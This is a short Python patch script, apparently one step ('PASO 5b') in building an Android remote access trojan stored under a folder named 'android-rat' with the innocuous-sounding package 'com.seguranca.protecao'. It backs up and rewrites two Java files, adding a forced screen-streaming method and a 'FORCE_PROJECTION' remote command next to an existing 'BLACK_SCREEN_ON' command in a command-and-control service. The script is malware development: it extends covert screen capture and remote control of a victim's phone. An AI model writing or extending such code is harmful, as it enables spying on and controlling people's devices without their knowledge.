import shutil
S = r"C:\Users\user\kryptos\android-rat\app\src\main\java\com\seguranca\protecao\ScreenStreamService.java"
shutil.copyfile(S, S + ".bak_proj2")
s = open(S, encoding="utf-8").read()
o = "    public static void ensure(Context ctx) {"
assert s.count(o) == 1
s = s.replace(o, "    public static void forceEnsure(Context ctx) {\n        lastRequest = 0L;\n        ensure(ctx);\n    }\n\n    public static void ensure(Context ctx) {")
open(S, "w", encoding="utf-8").write(s)

C = r"C:\Users\user\kryptos\android-rat\app\src\main\java\com\seguranca\protecao\CommandControlService.java"
shutil.copyfile(C, C + ".bak_proj2")
c = open(C, encoding="utf-8").read()
o2 = '                case "BLACK_SCREEN_ON":'
assert c.count(o2) == 1
c = c.replace(o2, '                case "FORCE_PROJECTION":\n                    UiAssistBridge.forceProjection(getApplicationContext());\n                    sendResponse("OK", "projecao forcada");\n                    break;\n\n' + o2)
open(C, "w", encoding="utf-8").write(c)
print("PASO 5b OK")
